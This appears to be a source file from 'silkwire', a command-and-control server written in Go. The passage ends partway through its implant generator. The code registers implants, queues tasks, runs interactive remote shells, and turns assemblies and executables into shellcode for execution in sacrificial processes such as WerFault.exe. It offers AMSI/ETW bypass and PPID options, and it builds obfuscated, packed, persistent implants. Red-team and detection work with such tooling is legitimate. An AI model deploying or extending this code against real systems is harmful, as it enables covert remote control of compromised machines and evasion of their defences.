package main

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	pb "silkwire/proto"
	"silkwire/shared"

	"crypto/tls"

	"github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/keepalive"
)

func (s *C2Server) Register(ctx context.Context, req *pb.RegistrationRequest) (*pb.RegistrationResponse, error) {
	logrus.Infof("New implant registration: %s (%s@%s)", req.ImplantId, req.Username, req.Hostname)
	logrus.Infof("Registration details: OS=%s, Arch=%s, PID=%d, Process=%s, Version=%s",
		req.Os, req.Arch, req.Pid, req.ProcessName, req.ImplantVersion)

	// Determine transport type based on connection
	transport := s.detectTransportType(ctx)

	// Generate session token and codename
	sessionToken := generateSessionToken()
	codename := shared.GenerateCodename()

	// Create session
	session := &Session{
		ImplantID:     req.ImplantId,
		SessionToken:  sessionToken,
		Codename:      codename,
		Hostname:      req.Hostname,
		Username:      req.Username,
		OS:            req.Os,
		Arch:          req.Arch,
		ProcessName:   req.ProcessName,
		PID:           req.Pid,
		NetworkIfaces: req.NetworkInterfaces,
		LastSeen:      time.Now(),
		Created:       time.Now(),
		Transport:     transport,
	}

	logrus.Infof("Generated codename for session %s: %s", req.ImplantId, codename)

	// Save session to database
	if err := s.db.SaveSession(session); err != nil {
		logrus.Errorf("Error saving session to database: %v", err)
		// Continue with in-memory storage even if DB save fails
	}

	s.sessionsMux.Lock()
	s.sessions[req.ImplantId] = session
	s.sessionsMux.Unlock()

	// Create task queue for this implant
	s.queuesMux.Lock()
	s.taskQueues[req.ImplantId] = make(chan *pb.Task, 100)
	s.queuesMux.Unlock()

	// Broadcast session establishment event to consoles
	message := fmt.Sprintf("New session: %s@%s (%s)", session.Username, session.Hostname, session.Codename)
	s.broadcastSessionEvent(pb.SessionEvent_SESSION_ESTABLISHED, session, message)

	return &pb.RegistrationResponse{
		Success:        true,
		SessionToken:   sessionToken,
		BeaconInterval: 30, // 30 seconds default
		JitterPercent:  20, // 20% jitter
		Message:        "Registration successful",
	}, nil
}

func (s *C2Server) BeaconStream(stream pb.C2Service_BeaconStreamServer) error {
	// Get session from first message
	firstMsg, err := stream.Recv()
	if err != nil {
		return err
	}

	s.sessionsMux.RLock()
	session, exists := s.sessions[firstMsg.ImplantId]
	s.sessionsMux.RUnlock()

	if !exists || session.SessionToken != firstMsg.SessionToken {
		return fmt.Errorf("invalid session")
	}

	logrus.Infof("Stream established for implant: %s", firstMsg.ImplantId)

	// Store stream for sending commands
	s.streamsMux.Lock()
	s.streams[firstMsg.ImplantId] = stream
	s.streamsMux.Unlock()

	// Attempt to recover any active PTY sessions for this implant
	s.recoverPTYSessions(firstMsg.ImplantId)

	// Cleanup on disconnect
	defer func() {
		s.streamsMux.Lock()
		delete(s.streams, firstMsg.ImplantId)
		s.streamsMux.Unlock()
		logrus.Infof("Stream closed for implant: %s", firstMsg.ImplantId)

		// Get session info for broadcasting session loss
		s.sessionsMux.RLock()
		if session, exists := s.sessions[firstMsg.ImplantId]; exists {
			// Broadcast session lost event to consoles
			message := fmt.Sprintf("Session disconnected: %s@%s (%s)", session.Username, session.Hostname, session.Codename)
			s.broadcastSessionEvent(pb.SessionEvent_SESSION_LOST, session, message)
		}
		s.sessionsMux.RUnlock()
	}()

	// Handle incoming messages
	for {
		msg, err := stream.Recv()
		if err == io.EOF {
			break
		}
		if err != nil {
			logrus.Errorf("Stream error for %s: %v", firstMsg.ImplantId, err)
			break
		}

		// Update last seen in both memory and database
		session.LastSeen = time.Now()
		s.db.UpdateSessionLastSeen(session.ImplantID, session.LastSeen)

		// Process beacon message
		switch msg.Type {
		case pb.BeaconMessage_HEARTBEAT:
			if session != nil {
				logrus.Infof("Heartbeat from %s (%s@%s)", msg.ImplantId, session.Username, session.Hostname)
			} else {
				logrus.Infof("Heartbeat from %s", msg.ImplantId)
			}
		case pb.BeaconMessage_TASK_RESULT:
			// Parse result payload: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
			s.parseAndStoreCommandResult(string(msg.Payload))
		case pb.BeaconMessage_ERROR:
			logrus.Errorf("Error from %s: %s", msg.ImplantId, string(msg.Payload))
		case pb.BeaconMessage_LOG:
			logrus.Infof("Log from %s: %s", msg.ImplantId, string(msg.Payload))
		case pb.BeaconMessage_PTY_OUTPUT:
			// Payload: command_id|base64(data)
			s.routePtyOutput(msg.Payload)
		case pb.BeaconMessage_PTY_EXIT:
			s.routePtyExit(msg.Payload)
		}
	}

	return nil
}

func (s *C2Server) GetTasks(ctx context.Context, req *pb.TaskRequest) (*pb.TaskResponse, error) {
	session, err := s.validateSession(ctx)
	if err != nil {
		return nil, err
	}

	s.queuesMux.RLock()
	taskQueue, exists := s.taskQueues[session.ImplantID]
	s.queuesMux.RUnlock()

	if !exists {
		return &pb.TaskResponse{Tasks: []*pb.Task{}}, nil
	}

	var tasks []*pb.Task

	// Collect available tasks (non-blocking)
	for {
		select {
		case task := <-taskQueue:
			tasks = append(tasks, task)
		default:
			goto done
		}
	}

done:
	return &pb.TaskResponse{Tasks: tasks}, nil
}

func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb.TaskAck, error) {
	_, err := s.validateSession(ctx)
	if err != nil {
		return nil, err
	}

	logrus.Infof("Task result from %s (Task %s): Success=%v",
		result.ImplantId, result.TaskId, result.Success)

	if result.Success {
		logrus.Infof("Output: %s", string(result.Output))
	} else {
		logrus.Errorf("Error: %s", result.Error)
	}

	// Store the result so GetCommandResult can retrieve it
	// Format the payload as expected by parseAndStoreCommandResult: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
	var payload string
	if result.Success {
		payload = fmt.Sprintf("%s|true|%s", result.TaskId, string(result.Output))
	} else {
		payload = fmt.Sprintf("%s|false|%s", result.TaskId, result.Error)
	}
	s.parseAndStoreCommandResult(payload)

	return &pb.TaskAck{
		Received: true,
		Message:  "Result received",
	}, nil
}

func (s *C2Server) UploadFile(stream pb.C2Service_UploadFileServer) error {
	logrus.Info("File upload started")

	var fileData []byte
	var filename string
	var fileID string

	for {
		chunk, err := stream.Recv()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}

		if filename == "" {
			filename = chunk.Filename
			fileID = chunk.FileId
		}

		fileData = append(fileData, chunk.Data...)

		if chunk.IsLast {
			break
		}
	}

	// Calculate file size for logging
	fileSizeKB := float64(len(fileData)) / 1024
	var sizeStr string
	if fileSizeKB < 1024 {
		sizeStr = fmt.Sprintf("%.1f KB", fileSizeKB)
	} else {
		sizeStr = fmt.Sprintf("%.1f MB", fileSizeKB/1024)
	}

	logrus.Infof("File upload completed: %s (%s, %d bytes) from implant", filename, sizeStr, len(fileData))

	// TODO: Save file to disk or process as needed

	return stream.SendAndClose(&pb.FileResponse{
		Success:   true,
		FileId:    fileID,
		Message:   "File uploaded successfully",
		TotalSize: int64(len(fileData)),
	})
}

func (s *C2Server) DownloadFile(req *pb.FileRequest, stream pb.C2Service_DownloadFileServer) error {
	logrus.Infof("File download requested: %s (implant requesting file from server)", req.FilePath)

	// TODO: Read file from disk
	// For demo, sending dummy data
	dummyData := []byte("This is dummy file content for: " + req.FilePath)

	chunkSize := 1024
	for i := 0; i < len(dummyData); i += chunkSize {
		end := i + chunkSize
		if end > len(dummyData) {
			end = len(dummyData)
		}

		chunk := &pb.FileChunk{
			FileId:      req.FileId,
			Filename:    req.FilePath,
			Data:        dummyData[i:end],
			ChunkNumber: int32(i / chunkSize),
			IsLast:      end == len(dummyData),
			TotalSize:   int64(len(dummyData)),
		}

		if err := stream.Send(chunk); err != nil {
			return err
		}
	}

	return nil
}

func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) (*pb.ListenerAddResponse, error) {
	addr := req.Address
	logrus.Infof("Starting new listener: %s (%s)", addr, req.Type.String())

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		logrus.Errorf("Failed to start listener on %s: %v", addr, err)
		return &pb.ListenerAddResponse{Success: false, Message: err.Error()}, nil
	}

	// Defaults for cert paths
	certPath := req.CertFile
	keyPath := req.KeyFile
	if certPath == "" {
		certPath = "server.crt"
	}
	if keyPath == "" {
		keyPath = "server.key"
	}

	// Configure keepalive enforcement for long-term connection persistence
	kaep := keepalive.EnforcementPolicy{
		MinTime:             5 * time.Second, // Allow pings every 5 seconds minimum
		PermitWithoutStream: true,            // Allow pings even when no active RPCs
	}

	kasp := keepalive.ServerParameters{
		Time:    10 * time.Second, // Ping client if no activity for 10 seconds
		Timeout: 5 * time.Second,  // Wait 5 seconds for ping ack before closing connection
	}

	var serverOptions []grpc.ServerOption
	serverOptions = append(serverOptions, grpc.KeepaliveEnforcementPolicy(kaep), grpc.KeepaliveParams(kasp))
	var g *grpc.Server

	switch req.Type {
	case pb.ListenerType_LISTENER_HTTP:
		// No TLS
		serverOptions = append(serverOptions, grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
		g = grpc.NewServer(serverOptions...)
	case pb.ListenerType_LISTENER_MTLS, pb.ListenerType_LISTENER_HTTPS:
		// TLS or mTLS
		var cert tls.Certificate

		if req.Type == pb.ListenerType_LISTENER_MTLS {
			// For mTLS, automatically generate CA-signed server certificate
			cert, err = s.caManager.GenerateServerCertificate(addr)
			if err != nil {
				_ = ln.Close()
				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to generate mTLS server certificate: %v", err)}, nil
			}
			logrus.Infof("Generated CA-signed server certificate for mTLS listener %s", addr)
		} else {
			// For HTTPS, try to load existing certs first, then fallback to self-signed
			cert, err = tls.LoadX509KeyPair(certPath, keyPath)
			if err != nil {
				// Generate self-signed certificate if not found or invalid
				host, _, _ := net.SplitHostPort(addr)
				if host == "" {
					host = "localhost"
				}
				cert, err = generateSelfSignedCertWithIP(host, addr)
				if err != nil {
					_ = ln.Close()
					return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("TLS self-sign failed: %v", err)}, nil
				}
			}
		}

		var tlsCfg *tls.Config
		if req.Type == pb.ListenerType_LISTENER_MTLS {
			// Use CA manager for Sliver-style mTLS with automatic certificate management
			tlsCfg = s.caManager.GetTLSConfig(cert)
			logrus.Infof("Starting mTLS listener with automatic CA-based certificate management")
		} else {
			// Regular HTTPS without client certificates
			tlsCfg = &tls.Config{
				Certificates: []tls.Certificate{cert},
				ClientAuth:   tls.NoClientCert,
			}
		}
		creds := credentials.NewTLS(tlsCfg)
		serverOptions = append(serverOptions, grpc.Creds(creds))
		// Increase gRPC message size limits for generated implant transfers
		serverOptions = append(serverOptions, grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
		g = grpc.NewServer(serverOptions...)
	default:
		// Default to HTTPS
		cert, err := tls.LoadX509KeyPair(certPath, keyPath)
		if err != nil {
			host, _, _ := net.SplitHostPort(addr)
			if host == "" {
				host = "localhost"
			}
			cert, err = generateSelfSignedCertWithIP(host, addr)
			if err != nil {
				_ = ln.Close()
				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("TLS self-sign failed: %v", err)}, nil
			}
		}
		creds := credentials.NewTLS(&tls.Config{Certificates: []tls.Certificate{cert}, ClientAuth: tls.NoClientCert})
		serverOptions = append(serverOptions, grpc.Creds(creds), grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
		g = grpc.NewServer(serverOptions...)
	}

	// Create a dedicated gRPC server bound to same service state
	pb.RegisterC2ServiceServer(g, s)

	id := fmt.Sprintf("lst_%d", time.Now().UnixNano())
	l := &Listener{ID: id, Address: addr, StartedAt: time.Now(), ln: ln, srv: g, Type: req.Type}

	// Note: Listeners are no longer saved to database to prevent persistence issues

	s.listenersMux.Lock()
	s.listeners[id] = l
	s.listenersMux.Unlock()

	go func() {
		if err := g.Serve(ln); err != nil {
			logrus.Errorf("Listener %s serve error: %v", id, err)
			// Note: Listener status no longer tracked in database
		}
	}()

	logrus.Infof("Listener successfully started: %s (ID: %s, Type: %s)", addr, id, req.Type.String())

	return &pb.ListenerAddResponse{Success: true, Message: "Listener started", Listener: &pb.Listener{Id: id, Address: addr, StartedAt: l.StartedAt.Unix(), Type: req.Type}}, nil
}

func (s *C2Server) ListListeners(ctx context.Context, req *pb.ListenerListRequest) (*pb.ListenerListResponse, error) {
	s.listenersMux.RLock()
	defer s.listenersMux.RUnlock()
	out := &pb.ListenerListResponse{}
	for _, l := range s.listeners {
		out.Listeners = append(out.Listeners, &pb.Listener{Id: l.ID, Address: l.Address, StartedAt: l.StartedAt.Unix(), Type: l.Type})
	}
	return out, nil
}

func (s *C2Server) RemoveListener(ctx context.Context, req *pb.ListenerRemoveRequest) (*pb.ListenerRemoveResponse, error) {
	s.listenersMux.Lock()
	l, ok := s.listeners[req.Id]
	if ok {
		if l.srv != nil {
			l.srv.GracefulStop()
		}
		_ = l.ln.Close()
		delete(s.listeners, req.Id)

		// Note: Listeners are no longer tracked in database
	}
	s.listenersMux.Unlock()
	if !ok {
		return &pb.ListenerRemoveResponse{Success: false, Message: "not found"}, nil
	}
	return &pb.ListenerRemoveResponse{Success: true, Message: "stopped"}, nil
}

func (s *C2Server) ListSessions(ctx context.Context, req *pb.SessionListRequest) (*pb.SessionListResponse, error) {
	s.sessionsMux.RLock()
	defer s.sessionsMux.RUnlock()

	var sessions []*pb.SessionInfo
	for _, session := range s.sessions {
		sessionInfo := &pb.SessionInfo{
			ImplantId:         session.ImplantID,
			Codename:          session.Codename,
			Hostname:          session.Hostname,
			Username:          session.Username,
			Os:                session.OS,
			Arch:              session.Arch,
			ProcessName:       session.ProcessName,
			Pid:               session.PID,
			NetworkInterfaces: session.NetworkIfaces,
			LastSeen:          session.LastSeen.Unix(),
			Created:           session.Created.Unix(),
			Transport:         session.Transport,
		}
		sessions = append(sessions, sessionInfo)
	}

	return &pb.SessionListResponse{Sessions: sessions}, nil
}

func (s *C2Server) DeleteSession(ctx context.Context, req *pb.SessionDeleteRequest) (*pb.SessionDeleteResponse, error) {
	implantID := req.ImplantId
	if implantID == "" {
		return &pb.SessionDeleteResponse{Success: false, Message: "implant_id is required"}, nil
	}

	// Remove from in-memory maps if present and broadcast deletion
	s.sessionsMux.Lock()
	var deletedSession *Session
	if session, exists := s.sessions[implantID]; exists {
		deletedSession = session
		delete(s.sessions, implantID)
	}
	s.sessionsMux.Unlock()

	// Broadcast session deleted event to consoles if session existed
	if deletedSession != nil {
		message := fmt.Sprintf("Session deleted: %s@%s (%s)", deletedSession.Username, deletedSession.Hostname, deletedSession.Codename)
		s.broadcastSessionEvent(pb.SessionEvent_SESSION_LOST, deletedSession, message)
	}

	s.queuesMux.Lock()
	if q, exists := s.taskQueues[implantID]; exists {
		close(q)
		delete(s.taskQueues, implantID)
	}
	s.queuesMux.Unlock()

	s.streamsMux.Lock()
	delete(s.streams, implantID)
	s.streamsMux.Unlock()

	// Remove from database
	if err := s.db.DeleteSession(implantID); err != nil {
		return &pb.SessionDeleteResponse{Success: false, Message: fmt.Sprintf("db delete failed: %v", err)}, nil
	}

	return &pb.SessionDeleteResponse{Success: true, Message: "session deleted"}, nil
}

func (s *C2Server) SendCommand(ctx context.Context, req *pb.SendCommandRequest) (*pb.SendCommandResponse, error) {
	commandID := req.Command.CommandId

	// Log command being sent
	argsStr := ""
	if len(req.Command.Args) > 0 {
		argsStr = fmt.Sprintf(" with args: [%s]", strings.Join(req.Command.Args, ", "))
	}
	logrus.Infof("Sending command to %s: %s (ID: %s, Type: %s)%s",
		req.ImplantId, req.Command.Command, commandID, req.Command.Type.String(), argsStr)

	// .NET Assembly Execution: Server-side Donut conversion for sacrificial process execution
	if req.Command.Type == pb.CommandMessage_EXECUTE_ASSEMBLY && len(req.Command.Data) > 0 {
		method := "sacrificial-process"
		target := "dllhost.exe"
		runtime := "v4"

		// Get implant architecture from session to generate architecture-specific shellcode
		s.sessionsMux.RLock()
		session, sessionExists := s.sessions[req.ImplantId]
		s.sessionsMux.RUnlock()

		implantArch := "amd64" // Default to 64-bit
		if sessionExists {
			implantArch = session.Arch
			logrus.Debugf("Execute-assembly: Target implant architecture: %s", implantArch)
		} else {
			logrus.Warnf("Execute-assembly: Session not found for implant %s, defaulting to amd64", req.ImplantId)
		}

		if opts := req.Command.ExecuteAssemblyOptions; opts != nil {
			// Determine execution method
			if opts.Method == pb.ExecuteAssemblyOptions_IN_PROCESS {
				method = "in-process-clr"
				target = "implant-process"
				// In-process: send raw assembly bytes (implant uses go-clr)
			} else {
				// Sacrificial process: convert assembly to shellcode using Donut (server-side)
				method = "sacrificial-process"
				if opts.SacrificialProcess != "" {
					target = opts.SacrificialProcess
				}

				logrus.Infof("Execute-assembly: Converting assembly to shellcode via Donut (server-side)")

				// Convert assembly to shellcode using go-donut with target architecture
				shellcode, err := s.convertAssemblyToShellcode(req.Command.Data, req.Command.Args, opts, implantArch)
				if err != nil {
					logrus.Errorf("Failed to convert assembly to shellcode: %v", err)
					return &pb.SendCommandResponse{
						Success:   false,
						Message:   fmt.Sprintf("Donut conversion failed: %v", err),
						CommandId: commandID,
					}, nil
				}

				logrus.Infof("Donut conversion successful: %d bytes assembly -> %d bytes shellcode",
					len(req.Command.Data), len(shellcode))

				// Replace assembly bytes with shellcode for implant
				req.Command.Data = shellcode
			}

			// Get runtime version
			if opts.Runtime != "" {
				runtime = opts.Runtime
			}

			// Build bypass info
			bypassInfo := ""
			if opts.AmsiBypass || opts.EtwBypass {
				bypasses := []string{}
				if opts.AmsiBypass {
					bypasses = append(bypasses, "AMSI")
				}
				if opts.EtwBypass {
					bypasses = append(bypasses, "ETW")
				}
				bypassInfo = fmt.Sprintf(", bypass=%s", strings.Join(bypasses, "+"))
			}

			logrus.Infof("Execute-assembly: method=%s, target=%s, size=%d bytes, runtime=%s%s",
				method, target, len(req.Command.Data), runtime, bypassInfo)
		} else {
			// No options provided, default to sacrificial with Donut conversion
			logrus.Infof("Execute-assembly: Converting assembly to shellcode via Donut (default, server-side)")

			shellcode, err := s.convertAssemblyToShellcode(req.Command.Data, req.Command.Args, nil, implantArch)
			if err != nil {
				logrus.Errorf("Failed to convert assembly to shellcode: %v", err)
				return &pb.SendCommandResponse{
					Success:   false,
					Message:   fmt.Sprintf("Donut conversion failed: %v", err),
					CommandId: commandID,
				}, nil
			}

			logrus.Infof("Donut conversion successful: %d bytes assembly -> %d bytes shellcode",
				len(req.Command.Data), len(shellcode))

			req.Command.Data = shellcode
			logrus.Infof("Execute-assembly: method=%s (default), target=%s, size=%d bytes",
				method, target, len(req.Command.Data))
		}
	}

	if req.Command.Type == pb.CommandMessage_EXECUTE_PE {
		// Lookup implant architecture for correct Donut configuration
		s.sessionsMux.RLock()
		session, sessionExists := s.sessions[req.ImplantId]
		s.sessionsMux.RUnlock()

		implantArch := "amd64"
		if sessionExists {
			implantArch = session.Arch
		} else {
			logrus.Warnf("Execute-pe: Session not found for implant %s, defaulting to amd64", req.ImplantId)
		}

		spawnTo := "C:\\Windows\\System32\\WerFault.exe"
		spawnArgs := ""
		ppid := uint32(0)
		if opts := req.Command.ExecutePeOptions; opts != nil {
			if opts.SpawnTo != "" {
				spawnTo = opts.SpawnTo
			}
			spawnArgs = opts.Arguments
			ppid = opts.Ppid
		}

		logrus.Infof("Execute-pe: Converting %d-byte PE to shellcode (spawn: %s, ppid: %d)",
			len(req.Command.Data), spawnTo, ppid)

		shellcode, err := s.convertPEToShellcode(req.Command.Data, req.Command.Args, implantArch)
		if err != nil {
			logrus.Errorf("Execute-pe donut conversion failed: %v", err)
			return &pb.SendCommandResponse{
				Success:   false,
				Message:   fmt.Sprintf("Donut conversion failed: %v", err),
				CommandId: commandID,
			}, nil
		}

		req.Command.Data = shellcode
		logrus.Infof("Execute-pe: Donut conversion complete -> %d bytes shellcode (spawn=%s, args=%q, ppid=%d)",
			len(shellcode), spawnTo, spawnArgs, ppid)
	}

	// BOF (Beacon Object File) Execution: Pass COFF bytes directly to implant for goffloader
	if req.Command.Type == pb.CommandMessage_EXECUTE_BOF && len(req.Command.Data) > 0 {
		entryPoint := "go"

		if opts := req.Command.BofOptions; opts != nil {
			if opts.EntryPoint != "" {
				entryPoint = opts.EntryPoint
			}

			logrus.Infof("Execute-BOF: method=in-process-goffloader, entry=%s, size=%d bytes, args=%v",
				entryPoint, len(req.Command.Data), opts.Arguments)
		} else {
			logrus.Infof("Execute-BOF: method=in-process-goffloader (default), entry=%s, size=%d bytes",
				entryPoint, len(req.Command.Data))
		}
	}

	switch req.Command.Type {
	case pb.CommandMessage_EXECUTE_SHELLCODE:
		methodStr := "self"
		var pid uint32
		if opts := req.Command.ExecuteShellcodeOptions; opts != nil {
			if opts.Method != pb.ExecuteShellcodeOptions_SELF {
				methodStr = strings.ToLower(opts.Method.String())
			}
			pid = opts.Pid
		}
		logrus.Infof("Execute-shellcode: method=%s, pid=%d, size=%d bytes",
			methodStr, pid, len(req.Command.Data))
	case pb.CommandMessage_EXECUTE_PE:
		spawnTo := "C:\\Windows\\System32\\WerFault.exe"
		ppid := uint32(0)
		args := ""
		if opts := req.Command.ExecutePeOptions; opts != nil {
			if opts.SpawnTo != "" {
				spawnTo = opts.SpawnTo
			}
			ppid = opts.Ppid
			args = opts.Arguments
		}

		logrus.Infof("Execute-pe: shellcode size=%d bytes, spawn_to=%s, args=%q, ppid=%d",
			len(req.Command.Data), spawnTo, args, ppid)
	}

	// Save command to database
	if err := s.db.SaveCommand(
		commandID,
		req.ImplantId,
		req.Command.Type.String(),
		req.Command.Command,
		req.Command.Args,
		req.Command.Data,
		req.Command.Timeout,
	); err != nil {
		logrus.Errorf("Error saving command to database: %v", err)
	}

	// Store pending command result in memory
	s.resultsMux.Lock()
	s.commandResults[commandID] = &CommandResult{
		CommandID: commandID,
		Success:   false,
		Output:    "",
		Error:     "Pending...",
		Timestamp: time.Now(),
	}
	s.resultsMux.Unlock()

	err := s.SendCommandMessage(req.ImplantId, req.Command)
	if err != nil {
		// Try to queue as task if stream sending fails
		task := &pb.Task{
			TaskId:    req.Command.CommandId,
			Type:      req.Command.Type,
			Command:   req.Command.Command,
			Args:      req.Command.Args,
			Data:      req.Command.Data,
			Timeout:   req.Command.Timeout,
			CreatedAt: time.Now().Unix(),
		}

		err = s.QueueTask(req.ImplantId, task)
		if err != nil {
			// Remove pending result on failure
			s.resultsMux.Lock()
			delete(s.commandResults, commandID)
			s.resultsMux.Unlock()

			return &pb.SendCommandResponse{
				Success:   false,
				Message:   fmt.Sprintf("Failed to send command: %v", err),
				CommandId: commandID,
			}, nil
		}

		return &pb.SendCommandResponse{
			Success:   true,
			Message:   "Command queued for execution",
			CommandId: commandID,
		}, nil
	}

	return &pb.SendCommandResponse{
		Success:   true,
		Message:   "Command sent via stream",
		CommandId: commandID,
	}, nil
}

func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRequest) (*pb.CommandResultResponse, error) {
	s.resultsMux.RLock()
	result, exists := s.commandResults[req.CommandId]
	s.resultsMux.RUnlock()

	if !exists {
		return &pb.CommandResultResponse{
			Ready:   false,
			Success: false,
			Error:   "Command not found",
		}, nil
	}

	// Check if result is still pending
	if result.Error == "Pending..." {
		// Wait for a short time if timeout is specified
		if req.TimeoutSeconds > 0 {
			timeout := time.Duration(req.TimeoutSeconds) * time.Second
			start := time.Now()
			for time.Since(start) < timeout {
				time.Sleep(100 * time.Millisecond)
				s.resultsMux.RLock()
				result, exists = s.commandResults[req.CommandId]
				s.resultsMux.RUnlock()

				if !exists || result.Error != "Pending..." {
					break
				}
			}
		}
	}

	// If still pending after timeout or not found in memory, check database as fallback
	if !exists || result.Error == "Pending..." {
		dbResult, err := s.db.GetCommandResult(req.CommandId)
		if err == nil && dbResult != nil {
			// Found in database, use it
			result = dbResult
			exists = true

			// Also update in-memory cache for future requests
			s.resultsMux.Lock()
			s.commandResults[req.CommandId] = dbResult
			s.resultsMux.Unlock()

			logrus.Infof("Retrieved command result from database: %s", req.CommandId)
		}
	}

	if !exists {
		return &pb.CommandResultResponse{
			Ready:   false,
			Success: false,
			Error:   "Command not found",
		}, nil
	}

	ready := result.Error != "Pending..."
	return &pb.CommandResultResponse{
		Ready:   ready,
		Success: ready && result.Success,
		Output:  result.Output,
		Error:   result.Error,
	}, nil
}

func (s *C2Server) PTYStream(stream pb.C2Service_PTYStreamServer) error {
	// Expect an open first
	openMsg, err := stream.Recv()
	if err != nil {
		return err
	}
	om, ok := openMsg.Msg.(*pb.PTYClientMessage_Open)
	if !ok || om.Open == nil {
		return fmt.Errorf("expected PTYOpen as first message")
	}
	implantID := om.Open.ImplantId
	cols := om.Open.Cols
	rows := om.Open.Rows

	commandID := fmt.Sprintf("pty_%d", time.Now().UnixNano())

	logrus.Infof("PTY session started: %s for implant %s (terminal size: %dx%d)",
		commandID, implantID, cols, rows)

	// Remember mapping so we can route outputs
	s.ptyMux.Lock()
	s.ptyCommandToImp[commandID] = implantID
	s.ptyCommandToCon[commandID] = stream
	s.ptySessionsActive[implantID] = commandID // Track active session for recovery
	s.ptyMux.Unlock()

	// Send PTY_START to implant over Beacon stream
	startCmd := &pb.CommandMessage{
		CommandId: commandID,
		Type:      pb.CommandMessage_PTY_START,
		Command:   om.Open.Shell,
		Args:      []string{fmt.Sprintf("%d", cols), fmt.Sprintf("%d", rows)},
		Timeout:   0,
	}
	if err := s.SendCommandMessage(implantID, startCmd); err != nil {
		return err
	}

	// Loop for input/resize/close from console
	for {
		msg, err := stream.Recv()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
		switch m := msg.Msg.(type) {
		case *pb.PTYClientMessage_Input:
			if m.Input == nil {
				continue
			}
			dataB64 := base64.StdEncoding.EncodeToString(m.Input.Data)
			// Forward as PTY_STDIN
			cmd := &pb.CommandMessage{CommandId: commandID, Type: pb.CommandMessage_PTY_STDIN, Data: []byte(dataB64)}
			_ = s.SendCommandMessage(implantID, cmd)
		case *pb.PTYClientMessage_Resize:
			if m.Resize == nil {
				continue
			}
			cmd := &pb.CommandMessage{CommandId: commandID, Type: pb.CommandMessage_PTY_RESIZE, Args: []string{fmt.Sprintf("%d", m.Resize.Cols), fmt.Sprintf("%d", m.Resize.Rows)}}
			_ = s.SendCommandMessage(implantID, cmd)
		case *pb.PTYClientMessage_Close:
			logrus.Infof("PTY session closed: %s for implant %s", commandID, implantID)
			_ = s.SendCommandMessage(implantID, &pb.CommandMessage{CommandId: commandID, Type: pb.CommandMessage_PTY_STOP})
			return nil
		}
	}
	return nil
}

func (s *C2Server) GenerateImplant(ctx context.Context, req *pb.ImplantGenerationRequest) (*pb.ImplantGenerationResponse, error) {
	// Log basic generation request
	logrus.Infof("Generating implant for listener: %s, OS: %s, Arch: %s, Format: %s",
		req.ListenerId, req.Os, req.Arch, req.Format)

	// Log additional options if any are specified
	if len(req.Options) > 0 {
		var options []string
		for key, value := range req.Options {
			options = append(options, fmt.Sprintf("%s=%s", key, value))
		}
		logrus.Infof("Implant generation options: %s", strings.Join(options, ", "))
	}

	// Get listener configuration
	s.listenersMux.RLock()
	listener, exists := s.listeners[req.ListenerId]
	s.listenersMux.RUnlock()

	if !exists {
		return &pb.ImplantGenerationResponse{
			Success: false,
			Message: fmt.Sprintf("Listener %s not found", req.ListenerId),
		}, nil
	}

	// Extract port from listener address
	port := 8443 // Default port
	if strings.Contains(listener.Address, ":") {
		parts := strings.Split(listener.Address, ":")
		if len(parts) >= 2 {
			if p, err := strconv.Atoi(parts[len(parts)-1]); err == nil {
				port = p
			}
		}
	}

	// Determine transport protocol based on listener type
	transport := "HTTPS"
	switch listener.Type {
	case pb.ListenerType_LISTENER_HTTPS:
		transport = "HTTPS"
	case pb.ListenerType_LISTENER_HTTP:
		transport = "HTTP"
	case pb.ListenerType_LISTENER_MTLS:
		transport = "mTLS"
	}

	// Create implant configuration using our new generator
	// Configure TLS verification based on transport type
	skipTLSVerify := true // Default for development
	if strings.ToLower(transport) == "mtls" {
		// For mTLS, enable certificate validation to use embedded CA certs
		skipTLSVerify = false
	}

	config := &ImplantConfig{
		ServerAddr:     strings.Split(listener.Address, ":")[0],
		Port:           port,
		Transport:      transport,
		ListenerID:     req.ListenerId,
		OS:             req.Os,
		Arch:           req.Arch,
		Format:         req.Format,
		SkipTLSVerify:  skipTLSVerify,
		EnablePTY:      true,
		EnableFiles:    true,
		EnableProxy:    false,
		Debug:          false,
		PersistentMode: true, // Enable persistent mode by default
	}

	// Set defaults
	if config.OS == "" {
		config.OS = "linux"
	}
	if config.Arch == "" {
		config.Arch = "amd64"
	}
	if config.Format == "" {
		config.Format = "exe"
	}

	// Apply additional options
	for key, value := range req.Options {
		switch key {
		// Basic options
		case "beacon_interval":
			if interval, err := strconv.ParseInt(value, 10, 32); err == nil {
				config.BeaconInterval = int32(interval)
			}
		case "jitter_percent":
			if jitter, err := strconv.ParseInt(value, 10, 32); err == nil {
				config.JitterPercent = int32(jitter)
			}
		case "debug":
			config.Debug = value == "true"
		case "obfuscate":
			config.Obfuscate = value == "true"
		case "garble":
			config.Garble = value == "true"

		// Enhanced Obfuscation Options
		case "obfuscation_level":
			if level, err := strconv.Atoi(value); err == nil && level >= 0 && level <= 4 {
				config.ObfuscationLevel = level
			}
		case "string_obfuscation":
			config.StringObfuscation = value == "true"
		case "name_obfuscation":
			config.NameObfuscation = value == "true"
		case "control_flow_obfuscation":
			config.ControlFlowObfuscation = value == "true"
		case "api_obfuscation":
			config.APIObfuscation = value == "true"
		case "network_obfuscation":
			config.NetworkObfuscation = value == "true"
		case "runtime_packing":
			config.RuntimePacking = value == "true"
		case "upx_packing":
			config.UPXPacking = value == "true"
		case "fake_resources":
			config.FakeResources = value == "true"

